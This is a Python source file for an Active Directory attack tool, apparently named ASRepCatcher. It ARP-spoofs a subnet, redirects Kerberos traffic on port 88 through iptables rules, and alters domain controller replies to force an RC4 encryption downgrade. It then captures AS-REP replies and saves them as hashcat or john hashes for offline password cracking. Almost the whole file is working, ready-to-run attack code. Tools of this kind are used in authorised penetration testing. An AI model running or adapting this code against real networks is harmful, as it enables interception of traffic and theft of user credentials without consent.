#!/usr/bin/env python3


# Author : Yassine OUKESSOU




from scapy.all import *
import asn1
import os
import argparse
from argparse import RawTextHelpFormatter
import time
import threading
import ipaddress
from termcolor import colored
import socket
import asyncio
import logging


decoder = asn1.Decoder()
stop_arp_spoofing_flag = threading.Event()


def handle_KRB_AS_REP(packet):
    if packet.haslayer(KRB_TGS_REP):
        decoder.start(bytes(packet.root.cname.nameString[0]))
        username = decoder.read()[1].decode().lower()
        decoder.start(bytes(packet.root.crealm))
        domain = decoder.read()[1].decode().lower()
        if username not in UsernamesSeen and username not in UsernamesCaptured :
            logging.info(f'[+] Sniffed TGS-REP for user {username}@{domain}')
            UsernamesSeen.add(username)
            return
    if not packet.haslayer(KRB_AS_REP):
        return
    decoder.start(bytes(packet.root.cname.nameString[0]))
    username = decoder.read()[1].decode().lower()
    decoder.start(bytes(packet.root.crealm))
    domain = decoder.read()[1].decode().lower()
    logging.info(f'[+] Got ASREP for username : {username}@{domain}')
    if username.endswith('$') :
        logging.debug(f'[*] Machine account : {username}, skipping...')
        return
    decoder.start(bytes(packet.root.encPart.etype))
    etype = decoder.read()[1]
    decoder.start(bytes(packet.root.encPart.cipher))
    cipher = decoder.read()[1].hex()
    if HashFormat == 'hashcat':
        if etype == 17 or etype == 18 :
            HashToCrack = f'$krb5asrep${etype}${username}${domain}${cipher[-24:]}${cipher[:-24]}'
        else :
            HashToCrack = f'$krb5asrep${etype}${username}@{domain}:{cipher[:32]}${cipher[32:]}'
    else :
        if etype == 17 or etype == 18 :
            HashToCrack = f'$krb5asrep${etype}${domain}{username}${cipher[:-24]}${cipher[-24:]}'
        else :
            HashToCrack = f'$krb5asrep${username}@{domain}:{cipher[:32]}${cipher[32:]}'
    if username in UsernamesCaptured and etype in UsernamesCaptured[username] :
        logging.info(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...')
        return
    else :
        print(colored(f'[+] Found hash to crack : {HashToCrack}', 'green', attrs=['bold']))
        if username in UsernamesCaptured :
            UsernamesCaptured[username].append(etype)
        else :
            UsernamesCaptured[username] = [etype]
    if etype == 17 and HashFormat == 'hashcat' :
        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/hashcat-6.2.6+813.7z mode : 32100 ')
    if etype == 18 and HashFormat == 'hashcat' :
        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/hashcat-6.2.6+813.7z mode : 32200 ')
    with open(outfile, 'a') as f:
        f.write(HashToCrack + '\n')
    if mode == 'listen' and not keep_spoofing and not disable_spoofing :
        Targets.remove(packet[IP].dst)
        restore(gw,packet[IP].dst)
        logging.info(f'[+] Restored arp cache of {packet[IP].dst}')



def listen_mode():
    try :
        sniff(filter=f"src port 88", prn=handle_KRB_AS_REP)
    except KeyboardInterrupt :
        pass
    except Exception as e :
        logging.error(f'[-] Got error : {e}')
    finally :
        print('\n')
        if not disable_spoofing :
            stop_arp_spoofing_flag.set()
            logging.info('[*] Restoring arp cache of the gateway, please hold...')
            restore_all_targets()
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        logging.info('[*] Disabled IPV4 forwarding')



def restore(poisoned_device, spoofed_ip):
    packet = ARP(op = 2, pdst = poisoned_device, psrc = spoofed_ip, hwsrc = getmacbyip(spoofed_ip)) 
    send(packet, verbose = False, count=1)

def restore_listenmode(dic_mac_addresses):
    del dic_mac_addresses[gw]
    for ip_address in dic_mac_addresses :
        packet = ARP(op = 2, pdst = gw, psrc = ip_address, hwsrc = dic_mac_addresses[ip_address]) 
        send(packet, verbose = False, count=1)


def update_uphosts():
    mac_addresses = get_all_mac_addresses()
    new_hosts = set(mac_addresses.keys()) - {gw, my_ip} - Targets
    old_hosts = Targets - set(mac_addresses.keys())
    logging.debug(f'[*] Net probe check, removing down hosts from targets : {list(old_hosts)}')
    if keep_spoofing : 
        Targets.update(new_hosts)
        logging.debug(f'[*] Net probe check, adding new hosts to targets : {list(new_hosts)}')
    Targets.difference_update(old_hosts)
    logging.debug(f'[*] Net probe check, updated targets list : {list(Targets)}')


def relaymode_arp_spoof(spoofed_ip):
    timer = 0
    while not stop_arp_spoofing_flag.is_set() and Targets != set():
        send(ARP(op = 2, pdst = list(Targets), psrc = spoofed_ip), verbose = False)
        time.sleep(1)
        timer += 1
        if timer == 5 :
            update_uphosts()
            timer = 0

def listenmode_arp_spoof():
    while not stop_arp_spoofing_flag.is_set() and Targets != set():
        send(ARP(op = 2, pdst = gw, psrc = list(Targets)), verbose = False)
        time.sleep(1)


def get_all_mac_addresses():
    mac_addresses = {}
    ip_with_mask = os.popen("ip -o -4 a show dev "+ conf.iface +" | awk '{print $4}'").read().strip()
    subnet = ipaddress.ip_network(ip_with_mask, strict=False)
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(subnet)),timeout=0.5,verbose=False)
    for i in ans :
        mac_addresses[i[1].psrc] = i[1].hwsrc
    return(mac_addresses)



def restore_all_targets():
    if mode == 'relay':
        for target in Targets :
            restore(target,gw)
    elif mode == 'listen':
        restore_listenmode(get_all_mac_addresses())


def is_valid_ip_list(iplist):
    if not re.match(r'^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?),)*((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$', iplist) :
        return False
    return True

def is_valid_ipwithmask(ip_with_mask):
    if not re.match(r'^([01]?\d\d?|2[0-4]\d|25[0-5])(?:\.(?:[01]?\d\d?|2[0-4]\d|25[0-5])){3}(?:/[0-2]\d|/3[0-2])?$', ip_with_mask):
        return False
    return True



async def handle_client(reader, writer):
    client_address = writer.get_extra_info('peername')[0]
    logging.info(f"[+] Connection from {client_address}")

    try:
        while True:
            data = await reader.read(2048)
            if not data:
                break

            dc_response = await relay_to_dc(data, client_address)
            writer.write(dc_response)
            await writer.drain()

    except Exception as e:
        logging.error(f'[!] Socket error: {e}')

    finally:
        writer.close()

async def relay_to_dc(data, client_address):
    host = dc
    port = 88
    kerberos_packet = KerberosTCPHeader(data)
    if kerberos_packet.haslayer(KRB_AS_REQ) and len(kerberos_packet.root.padata) != 2 and ASN1_INTEGER(23) in kerberos_packet.root.reqBody.etype :
        decoder.start(bytes(kerberos_packet.root.reqBody.cname.nameString[0]))
        username = decoder.read()[1].decode().lower()
        decoder.start(bytes(kerberos_packet.root.reqBody.realm))
        domain = decoder.read()[1].decode().lower()
        if username not in UsernamesCaptured :
            logging.info(f'[+] AS-REQ coming from {client_address} for {username}@{domain} : RC4 is supported by the client. The downgrade attack could work')
    elif kerberos_packet.haslayer(KRB_AS_REQ) and len(kerberos_packet.root.padata) != 2 and ASN1_INTEGER(23) not in kerberos_packet.root.reqBody.etype :
        logging.warning(f'[-] AS-REQ coming from {client_address} for {username}@{domain} : RC4 not supported by the client. RC4 may be disabled on client workstations...')
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    client_socket.sendall(data)
    response = client_socket.recv(2048)
    client_socket.close()
    krb_response = KerberosTCPHeader(response)

    if krb_response.haslayer(KRB_ERROR) and krb_response.root.errorCode == 0x19 :
        logging.info('[+] Hijacking Kerberos encryption negotiation...')
        RC4_present = False
        indexes_to_delete = []
        for idx, x in enumerate(krb_response.root.eData[0].seq[0].padataValue.seq) :
            if x.etype == 0x17 :
                RC4_present = True
            else :
                indexes_to_delete.append(idx)
        if not RC4_present :
            logging.warning("[!] RC4 not found in DC's supported algorithms. Downgrade to RC4 will not work")
            return response
        for i in indexes_to_delete :
            del krb_response.root.eData[0].seq[0].padataValue.seq[i]
        krb_response[KerberosTCPHeader].len = len(bytes(krb_response[Kerberos])) 
        return bytes(krb_response[KerberosTCPHeader])
    if krb_response.haslayer(KRB_AS_REP):
        handle_KRB_AS_REP(krb_response)
        if not keep_spoofing and not disable_spoofing :
            if client_address in Targets : Targets.remove(client_address)
            restore(client_address, gw)
            logging.info(f'[+] Restored arp cache of {client_address}')
        return response
    return response

async def relay_server():
    os.system("iptables-save > asrepcatcher_rules.v4")
    os.system("iptables -F")
    os.system("iptables -F -t nat")
    logging.info('[*] Saved current iptables\n\n')
    os.system(f'iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 88 -j DNAT --to 127.0.0.1:88')
    os.system(f'iptables -t nat -A PREROUTING -i {iface} -p udp --dport 88 -j DNAT --to 127.0.0.1:88')
    os.system(f'sysctl -w net.ipv4.conf.{iface}.route_localnet=1 1>/dev/null')

    server = await asyncio.start_server(handle_client, '0.0.0.0', 88)

    loop = asyncio.get_event_loop()

    async with server:
        await server.serve_forever()


def relay_mode() :
    try:
        asyncio.run(relay_server())
    except KeyboardInterrupt:
        pass
    finally :
        print('\n')
        if not disable_spoofing:
            stop_arp_spoofing_flag.set()
            logging.info(f'[*] Restoring arp cache of {len(Targets)} poisoned targets, please hold...')
            restore_all_targets()
        os.system("iptables-restore < asrepcatcher_rules.v4")
        logging.info("[*] Restored iptables")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        logging.info('[*] Disabled IPV4 forwarding')
        os.system(f'sysctl -w net.ipv4.conf.{iface}.route_localnet=0 1>/dev/null')



def main():
    if mode == 'relay' :
        relay_mode()
    else :
        listen_mode()



def display_banner():
    print("""            _____ _____             _____      _       _               
     /\    / ____|  __ \           / ____|    | |     | |              
    /  \  | (___ | |__) |___ _ __ | |     __ _| |_ ___| |__   ___ _ __ 
   / /\ \  \___ \|  _  // _ \ '_ \| |    / _` | __/ __| '_ \ / _ \ '__|
  / ____ \ ____) | | \ \  __/ |_) | |___| (_| | || (__| | | |  __/ |   
 /_/    \_\_____/|_|  \_\___| .__/ \_____\__,_|\__\___|_| |_|\___|_|   
                            | |                                        
                            |_|                                          - by Yassine OUKESSOU


                            """)

if __name__ == '__main__':
    if not 'SUDO_UID' in os.environ:
        logging.error("Please run as root")
        sys.exit(1)

    parser = argparse.ArgumentParser(add_help = True, description = "Catches Kerberos AS-REP packets and outputs it to a crackable format", formatter_class=RawTextHelpFormatter)

    parser.add_argument('mode', choices=['relay', 'listen'], action='store', help="Relay mode  : AS-REQ requests are relayed to capture AS-REP. Force clients to use RC4 if supported.\n"
                                                                                    "Listen mode : AS-REP packets going to clients are sniffed. No alteration of packets is performed.")
    parser.add_argument('-outfile', action='store', help='Output filename to write hashes to crack.')
    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Format to save the AS_REP hashes. Default is hashcat.')
    parser.add_argument('-debug', action='store_true', default=False, help='Increase verbosity')

    group = parser.add_argument_group('ARP poisoning')

    group.add_argument('-t', action='store', metavar = "Client workstations", help='Comma separated list of client computers IP addresses or subnet (IP/mask). In relay mode they will be poisoned. In listen mode, the AS-REP directed to them are captured. Default is whole subnet.')
    group.add_argument('-tf', action='store', help='File containing client workstations IP addresses.')
    group.add_argument('-gw', action='store', help='Gateway IP. More generally, the IP from which the AS-REP will be coming from. If DC is in the same VLAN, then specify the DC\'s IP. In listen mode, only this IP\'s ARP cache is poisoned. Default is default interface\'s gateway.')
    parser.add_argument('-dc', action='store', help='Domain controller\'s IP.')
    parser.add_argument('-iface', action='store', help='Interface to use. Uses default interface if not specified.')
    group.add_argument('--keep-spoofing', action='store_true', default=False, help='Keeps poisoning the targets after capturing AS-REP packets. False by default.')
    group.add_argument('--disable-spoofing', action='store_true', default=False, help='Disables arp spoofing, the MitM position is attained by the attacker using their own method. False by default : the tool uses its own arp spoofing method.')

    if len(sys.argv)==1:
        display_banner()
        parser.print_help()
        sys.exit(1)

    display_banner()
    parameters = parser.parse_args()
    if parameters.keep_spoofing == True and parameters.disable_spoofing == True :
        logging.error('[!] Cannot use --keep-spoofing and --disable-spoofing at the same time')
        sys.exit(1)



    if parameters.t is not None and parameters.tf is not None :
        logging.error('[!] Cannot use -t and -tf simultaneously')
        sys.exit(1)


    mode = parameters.mode
    outfile = parameters.outfile if parameters.outfile is not None else 'asrep_hashes.txt'
    HashFormat = parameters.format
    iface = parameters.iface if parameters.iface is not None else conf.iface
    keep_spoofing = parameters.keep_spoofing
    disable_spoofing = parameters.disable_spoofing
    gw = parameters.gw if parameters.gw is not None else conf.route.route("0.0.0.0")[2]
    dc = parameters.dc
    debug = parameters.debug

    if debug :
        logging.basicConfig(level=logging.DEBUG)
    else :
        logging.basicConfig(level=logging.INFO)

    if parameters.mode == 'relay' and parameters.dc is None :
        logging.error('[!] Must specify DC IP in relay mode. Quitting...')
        sys.exit(1)

    if not disable_spoofing :
        if parameters.iface is None :
            logging.warning(f'[*] No interface specified, will use the default interface : {iface}')
        else :
            if parameters.iface not in get_if_list():
                logging.error(f'[!] Interface {parameters.iface} was not found. Quitting...')
                sys.exit(1)
        if parameters.gw is None :
            logging.info(f'[*] No gateway specified, will use the default gateway of {iface} : {gw}')
        logging.info(f'[*] Gateway IP : {gw}')




    UsernamesCaptured = {}
    UsernamesSeen = set()
    HashesCaptured = set()
    logging.info(f'[*] Interface : {iface}')
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    logging.info('[*] Enabled IPV4 forwarding')

    if not disable_spoofing :
        if parameters.t is not None :
            if is_valid_ip_list(parameters.t.replace(' ','')) :
                TargetsList = parameters.t.replace(' ','').split(',')
            elif is_valid_ipwithmask(parameters.t) :
                subnet = ipaddress.ip_network(parameters.t, strict=False)
                TargetsList = [str(ip) for ip in subnet.hosts()]
            else :
                logging.error('[!] IP list in a bad format, expected format : 192.168.1.2,192.168.1.3,192.168.1.5 OR 192.168.1.0/24')
                sys.exit(1)
        elif parameters.tf is not None :
            try :
                with open(parameters.tf, 'r') as f:
                    iplist = f.read().strip().replace('\n',',')
            except Exception as e :
                logging.error(f'[-] Could not open file : {e}')
                sys.exit(1)
            if not is_valid_ip_list(iplist) :
                logging.error('[!] IP list in a bad format')
                sys.exit(1)
            TargetsList = iplist.split(',')
        else :
            ip_with_mask = os.popen("ip -o -4 a show dev "+ conf.iface +" | awk '{print $4}'").read().strip()
            subnet = ipaddress.ip_network(ip_with_mask, strict=False)
            TargetsList = [str(ip) for ip in subnet.hosts()]
            TargetsList.remove(gw)
            logging.info(f'[*] Targets not supplied, will use local subnet {subnet} minus the gateway')

        if gw in TargetsList and (parameters.t is not None or parameters.tf is not None) :
            logging.info('[*] Found gateway in targets list. Removing it')
            TargetsList.remove(gw)

        logging.info(f'[*] Scanning {iface} subnet')
        mac_addresses = get_all_mac_addresses()

        if gw not in mac_addresses :
            logging.error('[-] Gateway did not respond to ARP. Quitting...')
            sys.exit(1)

        Targets = set(TargetsList)

        my_ip = get_if_addr(conf.iface)
        if my_ip in Targets :
            Targets.remove(my_ip)

        if parameters.mode == 'listen':
            thread = threading.Thread(target=listenmode_arp_spoof)
            thread.start()
        elif parameters.mode == 'relay' :
            Targets = Targets - (Targets - set(mac_addresses.keys()))
            if Targets == set() :
                logging.error('[-] No target responded to ARP. Quitting...')
                sys.exit(1)
            thread = threading.Thread(target=relaymode_arp_spoof, args=(gw,))
            thread.start()

        logging.info('[+] Started ARP spoofing')
        logging.debug(f'[*] Net probe check, targets list : {list(Targets)}')
    else :
        logging.warning(f'[!] ARP spoofing disabled')

    main()
